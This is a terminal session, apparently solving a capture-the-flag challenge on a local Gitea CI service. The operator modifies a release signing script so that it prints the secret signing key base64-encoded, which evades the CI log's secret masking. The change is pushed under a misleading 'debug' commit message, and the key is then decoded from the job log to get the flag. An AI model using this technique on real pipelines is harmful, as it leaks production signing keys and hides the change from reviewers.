@@ -1,0 +1,203 @@
+2f7d9049babc:~/build-service$ curl -s -c /tmp/cookies.txt -X POST "http://127.0.0.1:3000/user/login" \
+  -d "user_name=builddev&password=devsync_9f3a_build" -o /tmp/login.html -w "%{http_code}\n"
+303
+2f7d9049babc:~/build-service$
+
+2f7d9049babc:~/build-service$ curl -s -b /tmp/cookies.txt "http://127.0.0.1:3000/challenges/build-service/actions/runs/2" -o /tmp/run2b.html
+wc -l /tmp/run2b.html
+grep -o "/api/v1/[a-zA-Z0-9/_-]*" /tmp/run2b.html | sort -u
+505 /tmp/run2b.html
+2f7d9049babc:~/build-service$
+
+2f7d9049babc:~/build-service$ grep -o 'src="[^"]*"' /tmp/run2b.html | sort -u
+grep -i "csrf" /tmp/run2b.html | head -5
+src="/assets/img/logo.svg"
+src="/assets/js/index.js?v=1.23.8"
+src="/assets/js/webcomponents.js?v=1.23.8"
+src="/avatars/2baf1152bf841eafec1107b1dd503e80?size=48"
+                csrfToken: 'cYI0tuDA0vDiN3qs4QwccQheOCo6MTc4NjEyNDQ0NTcyOTYxMDc3MQ',
+<body hx-headers='{"x-csrf-token": "cYI0tuDA0vDiN3qs4QwccQheOCo6MTc4NjEyNDQ0NTcyOTYxMDc3MQ"}' hx-swap="outerHTML" hx-ext="morph" hx-push-url="false">
+2f7d9049babc:~/build-service$
+
+2f7d9049babc:~/build-service$ CSRF="cYI0tuDA0vDiN3qs4QwccQheOCo6MTc4NjEyNDQ0NTcyOTYxMDc3MQ"
+curl -s -b /tmp/cookies.txt -H "x-csrf-token: $CSRF" \
+  "http://127.0.0.1:3000/challenges/build-service/actions/runs/2/jobs/0" -o /tmp/job0.html
+wc -l /tmp/job0.html
+505 /tmp/job0.html
+2f7d9049babc:~/build-service$
+
+2f7d9049babc:~/build-service$ cat scripts/sign.sh
+#!/bin/sh
+set -eu
+
+artifact="${1:-}"
+if [ -z "$artifact" ]; then
+  echo "usage: sign.sh <artifact>"
+  exit 1
+fi
+
+if [ -z "${SIGNING_KEY:-}" ]; then
+  echo "missing signing key"
+  exit 1
+fi
+
+if [ ! -f "$artifact" ]; then
+  echo "artifact not found: $artifact"
+  exit 1
+fi
+
+echo "signing release artifact for ${DEPLOY_ENV:-unknown}"
+echo "artifact signed"
+echo "DEBUG_SIGNING_KEY=${SIGNING_KEY}"
+2f7d9049babc:~/build-service$ sed -i '/DEBUG_SIGNING_KEY/d' scripts/sign.sh
+cat >> scripts/sign.sh << 'EOF'
+echo "DEBUG_SIGNING_KEY_B64=$(printf '%s' "${SIGNING_KEY}" | base64)"
+EOF
+cat scripts/sign.sh
+#!/bin/sh
+set -eu
+
+artifact="${1:-}"
+if [ -z "$artifact" ]; then
+  echo "usage: sign.sh <artifact>"
+  exit 1
+fi
+
+if [ -z "${SIGNING_KEY:-}" ]; then
+  echo "missing signing key"
+  exit 1
+fi
+
+if [ ! -f "$artifact" ]; then
+  echo "artifact not found: $artifact"
+  exit 1
+fi
+
+echo "signing release artifact for ${DEPLOY_ENV:-unknown}"
+echo "artifact signed"
+echo "DEBUG_SIGNING_KEY_B64=$(printf '%s' "${SIGNING_KEY}" | base64)"
+2f7d9049babc:~/build-service$
+
+2f7d9049babc:~/build-service$ git add scripts/sign.sh
+git commit -m "debug: base64 encode diagnostics"
+git push origin main
+[main 412f25d] debug: base64 encode diagnostics
+ 1 file changed, 1 insertion(+), 1 deletion(-)
+Enumerating objects: 7, done.
+Counting objects: 100% (7/7), done.
+Delta compression using up to 4 threads
+Compressing objects: 100% (3/3), done.
+Writing objects: 100% (4/4), 390 bytes | 390.00 KiB/s, done.
+Total 4 (delta 2), reused 0 (delta 0), pack-reused 0 (from 0)
+remote: . Processing 1 references
+remote: Processed 1 references in total
+To http://127.0.0.1:3000/challenges/build-service.git
+   46ce7d5..412f25d  main -> main
+2f7d9049babc:~/build-service$ curl -s -u builddev:devsync_9f3a_build "http://127.0.0.1:3000/api/v1/repos/challenges/build-service/actions/tasks" | python3 -m json.tool
+{
+    "workflow_runs": [
+        {
+            "id": 3,
+            "name": "release",
+            "head_branch": "main",
+            "head_sha": "412f25dc67655b1ea58ef1026c3eae1543be78be",
+            "run_number": 3,
+            "event": "push",
+            "display_title": "debug: base64 encode diagnostics",
+            "status": "success",
+            "workflow_id": "release.yml",
+            "url": "http://127.0.0.1:8000/challenges/build-service/actions/runs/3",
+            "created_at": "2026-08-07T17:42:48Z",
+            "updated_at": "2026-08-07T17:42:49Z",
+            "run_started_at": "2026-08-07T17:42:48Z"
+        },
+        {
+            "id": 2,
+            "name": "release",
+            "head_branch": "main",
+            "head_sha": "46ce7d579ff9eba5818581c3374e3dc11588c696",
+            "run_number": 2,
+            "event": "push",
+            "display_title": "debug: add signing diagnostics",
+            "status": "success",
+            "workflow_id": "release.yml",
+            "url": "http://127.0.0.1:8000/challenges/build-service/actions/runs/2",
+            "created_at": "2026-08-07T17:35:26Z",
+            "updated_at": "2026-08-07T17:35:27Z",
+            "run_started_at": "2026-08-07T17:35:26Z"
+        },
+        {
+            "id": 1,
+            "name": "release",
+            "head_branch": "main",
+            "head_sha": "417d3d10d927b950a3fa75dd9e60a2f36ca88606",
+            "run_number": 1,
+            "event": "push",
+            "display_title": "Initial vulnerable build service",
+            "status": "success",
+            "workflow_id": "release.yml",
+            "url": "http://127.0.0.1:8000/challenges/build-service/actions/runs/1",
+            "created_at": "2026-08-07T17:27:18Z",
+            "updated_at": "2026-08-07T17:27:19Z",
+            "run_started_at": "2026-08-07T17:27:18Z"
+        }
+    ],
+    "total_count": 3
+}
+2f7d9049babc:~/build-service$ curl -s -b /tmp/cookies.txt -H "x-csrf-token: $CSRF" \
+  "http://127.0.0.1:3000/challenges/build-service/actions/runs/3/jobs/0/logs"
+2026-08-07T17:42:48.4481449Z ctf-runner(version:v0.2.11) received task 3 of job 3, be triggered by event: push
+2026-08-07T17:42:48.4487198Z workflow prepared
+2026-08-07T17:42:48.4488329Z evaluating expression 'success()'
+2026-08-07T17:42:48.4489394Z expression 'success()' evaluated to 'true'
+2026-08-07T17:42:48.4556359Z expression '${{ secrets.PROD_SIGNING_KEY }}' rewritten to 'format('{0}', secrets.PROD_SIGNING_KEY)'
+2026-08-07T17:42:48.4556874Z evaluating expression 'format('{0}', secrets.PROD_SIGNING_KEY)'
+2026-08-07T17:42:48.4557455Z expression 'format('{0}', secrets.PROD_SIGNING_KEY)' evaluated to '%!t(string=***)'
+2026-08-07T17:42:48.4557761Z expression '${{ secrets.DEPLOY_ENV }}' rewritten to 'format('{0}', secrets.DEPLOY_ENV)'
+2026-08-07T17:42:48.4557910Z evaluating expression 'format('{0}', secrets.DEPLOY_ENV)'
+2026-08-07T17:42:48.4558310Z expression 'format('{0}', secrets.DEPLOY_ENV)' evaluated to '%!t(string=***)'
+2026-08-07T17:42:48.4559683Z evaluating expression ''
+2026-08-07T17:42:48.4560103Z expression '' evaluated to 'true'
+2026-08-07T17:42:48.4560345Z ⭐ Run Main Checkout repository
+2026-08-07T17:42:48.4686808Z expression '# Use Gitea template injection for variables and auth\ngit clone "http://${{ github.actor }}:${{ github.token }}@localhost:3000/${{ github.repository }}.git" .\ngit checkout "${{ github.sha }}"\n' rewritten to 'format('# Use Gitea template injection for variables and auth\ngit clone "http://{0}:{1}@localhost:3000/{2}.git" .\ngit checkout "{3}"\n', github.actor, github.token, github.repository, github.sha)'
+2026-08-07T17:42:48.4688010Z evaluating expression 'format('# Use Gitea template injection for variables and auth\ngit clone "http://{0}:{1}@localhost:3000/{2}.git" .\ngit checkout "{3}"\n', github.actor, github.token, github.repository, github.sha)'
+2026-08-07T17:42:48.4689881Z expression 'format('# Use Gitea template injection for variables and auth\ngit clone "http://{0}:{1}@localhost:3000/{2}.git" .\ngit checkout "{3}"\n', github.actor, github.token, github.repository, github.sha)' evaluated to '%!t(string=# Use Gitea template injection for variables and auth\ngit clone "http://builddev:***@localhost:3000/challenges/build-service.git" .\ngit checkout "412f25dc67655b1ea58ef1026c3eae1543be78be"\n)'
+2026-08-07T17:42:48.4690434Z Wrote command \n\n# Use Gitea template injection for variables and auth\ngit clone "http://builddev:***@localhost:3000/challenges/build-service.git" .\ngit checkout "412f25dc67655b1ea58ef1026c3eae1543be78be"\n\n\n to 'workflow/0.sh'
+2026-08-07T17:42:48.5071656Z Cloning into '.'...
+2026-08-07T17:42:48.9334488Z remote: Enumerating objects: 19, done.
+remote: Counting objects: 100% (19/19), done.        :   5% (1/19)
+remote: Compressing objects: 100% (13/13), done.        :   7% (1/13)
+2026-08-07T17:42:48.9360401Z remote: Total 19 (delta 4), reused 0 (delta 0), pack-reused 0 (from 0)
+Receiving objects: 100% (19/19), done. objects:   5% (1/19)
+Resolving deltas: 100% (4/4), done.ing deltas:   0% (0/4)
+2026-08-07T17:42:49.0206371Z Note: switching to '412f25dc67655b1ea58ef1026c3eae1543be78be'.
+2026-08-07T17:42:49.0207142Z
+2026-08-07T17:42:49.0207356Z You are in 'detached HEAD' state. You can look around, make experimental
+2026-08-07T17:42:49.0207814Z changes and commit them, and you can discard any commits you make in this
+2026-08-07T17:42:49.0208318Z state without impacting any branches by switching back to a branch.
+2026-08-07T17:42:49.0208567Z
+2026-08-07T17:42:49.0208746Z If you want to create a new branch to retain commits you create, you may
+2026-08-07T17:42:49.0208991Z do so (now or later) by using -c with the switch command. Example:
+2026-08-07T17:42:49.0209192Z
+2026-08-07T17:42:49.0209491Z   git switch -c <new-branch-name>
+2026-08-07T17:42:49.0209712Z
+2026-08-07T17:42:49.0209917Z Or undo this operation with:
+2026-08-07T17:42:49.0210139Z
+2026-08-07T17:42:49.0210308Z   git switch -
+2026-08-07T17:42:49.0210514Z
+2026-08-07T17:42:49.0210689Z Turn off this advice by setting config variable advice.detachedHead to false
+2026-08-07T17:42:49.0210882Z
+2026-08-07T17:42:49.0217831Z HEAD is now at 412f25d debug: base64 encode diagnostics
+2026-08-07T17:42:49.0539092Z mkdir -p dist
+2026-08-07T17:42:49.0708562Z echo "telemetry: cubesat payload online" > dist/app.txt
+2026-08-07T17:42:49.0709611Z tar -czf dist/app.tar.gz dist/app.txt
+2026-08-07T17:42:49.0710379Z flight build complete
+2026-08-07T17:42:49.0894780Z signing release artifact for ***
+2026-08-07T17:42:49.0899699Z artifact signed
+2026-08-07T17:42:49.1194417Z DEBUG_SIGNING_KEY_B64=U1RBUlBXTntrMWNrXzEwOTFjXzcwXzdoM19jdTI4XzRuZF9kMF83aDNfMW1wMDU1MTgxM30=
+2026-08-07T17:42:49.1235872Z Cleaning up container for job release
+2026-08-07T17:42:49.1411221Z 🏁  Job succeeded
+2f7d9049babc:~/build-service$
+
+echo "U1RBUlBXTntrMWNrXzEwOTFjXzcwXzdoM19jdTI4XzRuZF9kMF83aDNfMW1wMDU1MTgxM30=" | base64 -d
+STARPWN{k1ck_1091c_70_7h3_cu28_4nd_d0_7h3_1mp0551813}
